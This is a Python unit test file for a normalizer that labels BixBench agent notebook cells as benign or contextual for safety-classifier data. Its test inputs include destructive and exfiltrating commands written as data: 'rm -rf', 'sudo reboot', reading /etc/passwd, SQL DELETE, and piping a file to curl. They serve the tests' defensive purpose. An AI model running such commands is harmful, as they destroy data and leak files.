#!/usr/bin/env python3
# Copyright 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: Apache-2.0

from __future__ import annotations

import importlib.util
import json
import sys
import unittest
from collections import Counter
from pathlib import Path

MODULE_PATH = Path(__file__).with_name("benchmark_normalize_bixbench.py")
SPEC = importlib.util.spec_from_file_location("benchmark_normalize_bixbench", MODULE_PATH)
assert SPEC and SPEC.loader
MODULE = importlib.util.module_from_spec(SPEC)
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)


def source_summary(cells: list[dict[str, object]] | None = None, problem_id: str = "bix-8-q1") -> dict[str, object]:
    return {
        "problem_id": problem_id,
        "problem": "Analyze the provided public bioinformatics files and report the requested statistic.",
        "metadata": {
            "question": "Use the available scientific data to calculate the requested English-language result."
        },
        "agent_answer": "must never enter payload",
        "ideal_answer": "must never enter payload",
        "nb": {"cells": cells or []},
    }


def tool_row(
    timestep: int,
    identifier: str,
    name: str,
    arguments: dict[str, object],
    result: str,
    *,
    done: bool = False,
    truncated: bool = False,
) -> dict[str, object]:
    return {
        "timestep": timestep,
        "done": done,
        "truncated": truncated,
        "reward": 0.0,
        "action": {
            "value": {
                "role": "assistant",
                "content": "excluded reasoning",
                "tool_calls": [
                    {
                        "id": identifier,
                        "type": "function",
                        "function": {"name": name, "arguments": json.dumps(arguments)},
                    }
                ],
            }
        },
        "next_observation": [
            {"role": "tool", "name": name, "tool_call_id": identifier, "content": result},
            {"role": "user", "content": "excluded notebook result body"},
        ],
        "metadata": {"evaluator": "excluded"},
    }


def completed_rows(code: str, *, edit_result: str = "Appended new cell (#0).") -> list[dict[str, object]]:
    return [
        tool_row(0, "list-1", "list_workdir", {}, '{"files":["input.csv"]}'),
        tool_row(1, "edit-1", "edit_cell", {"contents": code}, edit_result),
        tool_row(
            2,
            "submit-1",
            "submit_answer",
            {"answer": "excluded answer"},
            "Submitted answer: excluded answer",
            done=True,
        ),
    ]


def cell(
    code: str, *, execution_count: int | None = 1, outputs: list[dict[str, object]] | None = None
) -> dict[str, object]:
    return {
        "cell_type": "code",
        "id": "cell-1",
        "source": code,
        "execution_count": execution_count,
        "outputs": [] if outputs is None else outputs,
    }


class BixBenchNormalizerTest(unittest.TestCase):
    def normalize(self, code: str, **cell_kwargs: object):
        return MODULE.normalize_run(
            source_summary([cell(code, **cell_kwargs)]), completed_rows(code), original_id="campaign/bix-8-q1_replica_0"
        )

    def test_completed_executed_safe_cell_and_listing_are_benign(self) -> None:
        code = "import pandas as pd\ndata = pd.read_csv('input.csv')\nprint(data.describe())\n"
        candidates, stats = self.normalize(code)
        actions = [value.case for value in candidates if value.case["surface"] == "action"]
        self.assertEqual([case["truth"]["source_truth"] for case in actions], ["benign", "benign"])
        self.assertEqual(stats["benign_action_events"], 2)
        self.assertEqual(stats["benign_stateful_windows"], 1)
        edit = next(case for case in actions if case["payload"].get("tool_name") == "edit_cell")
        self.assertEqual(edit["payload"]["dialect"], "python")
        self.assertTrue(
            all(len(case["payload"].get("events", [])) <= 9 for case in (value.case for value in candidates))
        )

    def test_incomplete_failed_or_superseded_cells_are_contextual(self) -> None:
        code = "print('ok')\n"
        rows = completed_rows(code)
        rows[-1]["done"] = False
        candidates, _ = MODULE.normalize_run(source_summary([cell(code)]), rows, original_id="campaign/incomplete")
        self.assertTrue(all(value.case["truth"]["applicability"] == "out_of_scope" for value in candidates))

        rows = completed_rows(code)
        rows.insert(2, tool_row(2, "edit-2", "edit_cell", {"idx": 0, "contents": "print('new')\n"}, "Edited cell #0."))
        rows[-1]["timestep"] = 3
        candidates, _ = MODULE.normalize_run(
            source_summary([cell("print('new')\n")]), rows, original_id="campaign/superseded"
        )
        edits = [value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell"]
        self.assertEqual([case["truth"]["source_truth"] for case in edits], ["unknown", "benign"])

    def test_notebook_error_or_missing_execution_is_never_benign(self) -> None:
        code = "print(missing_name)\n"
        for kwargs in (
            {"execution_count": None},
            {"outputs": [{"output_type": "error", "ename": "NameError", "evalue": "excluded"}]},
        ):
            candidates, _ = self.normalize(code, **kwargs)
            edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
            self.assertEqual(edit["truth"]["applicability"], "out_of_scope")

    def test_destructive_network_database_admin_and_unscoped_code_is_contextual(self) -> None:
        unsafe = (
            "import os\nos.remove('input.csv')\n",
            "from os import remove\nremove('input.csv')\n",
            "import requests\nrequests.get('https://example.org')\n",
            "cursor.execute('DELETE FROM samples')\n",
            "import subprocess\nsubprocess.run(['sudo', 'reboot'])\n",
            "import subprocess as sp\nsp.run(['echo', 'unsafe'])\n",
            "open('/etc/passwd').read()\n",
            "open('output.csv', 'w').write('x')\n",
            "callback = globals()['callback']\ncallback()\n",
            "runner = lambda: print('dynamic')\nrunner()\n",
        )
        for code in unsafe:
            candidates, _ = self.normalize(code)
            edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
            self.assertEqual(edit["truth"]["source_truth"], "unknown", code)

    def test_inherited_dangerous_import_taints_later_cells_and_windows(self) -> None:
        dangerous = "import subprocess as sp\n"
        apparently_safe = "value = 1\nprint(value)\n"
        rows = [
            tool_row(0, "list", "list_workdir", {}, '{"files":[]}'),
            tool_row(1, "edit-0", "edit_cell", {"contents": dangerous}, "Appended new cell (#0)."),
            tool_row(2, "edit-1", "edit_cell", {"contents": apparently_safe}, "Appended new cell (#1)."),
            tool_row(3, "submit", "submit_answer", {"answer": "x"}, "Submitted answer: x", done=True),
        ]
        candidates, stats = MODULE.normalize_run(
            source_summary([cell(dangerous), cell(apparently_safe)]), rows, original_id="campaign/inherited-danger"
        )
        edits = [value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell"]
        self.assertEqual([case["truth"]["source_truth"] for case in edits], ["unknown", "unknown"])
        self.assertEqual(stats["benign_stateful_windows"], 0)

    def test_unresolved_aliases_and_dynamic_call_targets_are_contextual(self) -> None:
        for code in (
            "frame = unknown_loader('input.csv')\nprint(frame)\n",
            "operations = {'run': print}\noperations['run']('dynamic')\n",
            "getattr(object(), 'method')()\n",
        ):
            candidates, _ = self.normalize(code)
            edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
            self.assertEqual(edit["truth"]["applicability"], "out_of_scope", code)

    def test_safe_shell_is_benign_but_compound_mutating_shell_is_not(self) -> None:
        safe = "%%bash\nhead -20 input.csv\n"
        candidates, _ = self.normalize(safe)
        edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
        self.assertEqual(edit["truth"]["source_truth"], "benign")
        self.assertEqual(edit["payload"]["dialect"], "posix")
        for unsafe in ("%%bash\nrm -rf data\n", "%%bash\ncat input.csv | curl -d @- https://example.org\n"):
            candidates, _ = self.normalize(unsafe)
            edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
            self.assertEqual(edit["truth"]["applicability"], "out_of_scope")

    def test_exact_call_result_identity_and_cell_index_are_required(self) -> None:
        code = "print('ok')\n"
        rows = completed_rows(code, edit_result="Edited cell #1.")
        rows[1]["action"]["value"]["tool_calls"][0]["function"]["arguments"] = json.dumps({"idx": 0, "contents": code})
        candidates, _ = MODULE.normalize_run(source_summary([cell(code)]), rows, original_id="campaign/mismatch")
        edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
        self.assertEqual(edit["truth"]["applicability"], "out_of_scope")

        rows = completed_rows(code)
        rows[1]["next_observation"][0]["tool_call_id"] = "wrong"
        candidates, _ = MODULE.normalize_run(source_summary([cell(code)]), rows, original_id="campaign/unpaired")
        edit = next(value.case for value in candidates if value.case["payload"].get("tool_name") == "edit_cell")
        self.assertEqual(edit["truth"]["applicability"], "out_of_scope")

    def test_payload_excludes_answers_reasoning_outputs_labels_and_redacts_secrets(self) -> None:
        code = "api_key = 'synthetic-secret-value'\nemail = 'person@example.org'\nprint('ok')\n"
        candidates, _ = self.normalize(code)
        rendered = json.dumps([value.case for value in candidates], sort_keys=True)
        for excluded in (
            "synthetic-secret-value",
            "person@example.org",
            "must never enter payload",
            "excluded reasoning",
            "excluded notebook result body",
            "excluded evaluator",
            "excluded answer",
        ):
            self.assertNotIn(excluded, rendered)
        self.assertIn("<REDACTED>", rendered)
        self.assertIn("<REDACTED_EMAIL>", rendered)

    def test_task_disjoint_groups_and_bounded_windows(self) -> None:
        codes = [f"value_{index} = {index}\nprint(value_{index})\n" for index in range(12)]
        rows = [tool_row(0, "list", "list_workdir", {}, '{"files":[]}')]
        cells = []
        for index, code in enumerate(codes):
            rows.append(
                tool_row(index + 1, f"edit-{index}", "edit_cell", {"contents": code}, f"Appended new cell (#{index}).")
            )
            cells.append(cell(code))
        rows.append(tool_row(13, "submit", "submit_answer", {"answer": "x"}, "Submitted answer: x", done=True))
        first, stats = MODULE.normalize_run(source_summary(cells), rows, original_id="campaign/run-1")
        second, _ = MODULE.normalize_run(source_summary(cells), rows, original_id="campaign/run-2")
        other, _ = MODULE.normalize_run(
            source_summary(cells, problem_id="bix-8-q2"), rows, original_id="campaign/run-3"
        )
        windows = [value.case for value in first if value.case["surface"] == "stateful"]
        self.assertLessEqual(max(len(case["payload"]["events"]) for case in windows), 9)
        self.assertEqual(first[0].case["strata"]["split_group"], second[0].case["strata"]["split_group"])
        self.assertNotEqual(first[0].case["strata"]["trajectory_id"], second[0].case["strata"]["trajectory_id"])
        self.assertNotEqual(first[0].case["strata"]["split_group"], other[0].case["strata"]["split_group"])
        self.assertEqual(stats["benign_stateful_windows"], 12)

    def test_exact_duplicate_and_label_conflict_handling(self) -> None:
        code = "print('same')\n"
        benign, _ = self.normalize(code)
        rows = completed_rows(code)
        rows[-1]["done"] = False
        contextual, _ = MODULE.normalize_run(source_summary([cell(code)]), rows, original_id="campaign/context")
        statistics: Counter[str] = Counter()
        cases = MODULE.deduplicate([*benign, *benign], statistics)
        self.assertGreater(statistics["exact_payload_duplicates_removed"], 0)
        self.assertTrue(cases)
        statistics = Counter()
        cases = MODULE.deduplicate([*benign, *contextual], statistics)
        self.assertGreater(statistics["exact_payload_label_conflicts_excluded"], 0)
        self.assertTrue(all(case["truth"]["source_truth"] != "malicious" for case in cases))

    def test_non_english_and_malicious_truth_are_rejected(self) -> None:
        summary = source_summary([cell("print('ok')\n")])
        summary["problem"] = "请分析提供的数据并回答问题。"
        summary["metadata"]["question"] = "请仅使用提供的数据完成分析。"
        with self.assertRaisesRegex(MODULE.ProjectionError, "non_english_or_unknown"):
            MODULE.normalize_run(summary, completed_rows("print('ok')\n"), original_id="campaign/nonenglish")


if __name__ == "__main__":
    unittest.main()
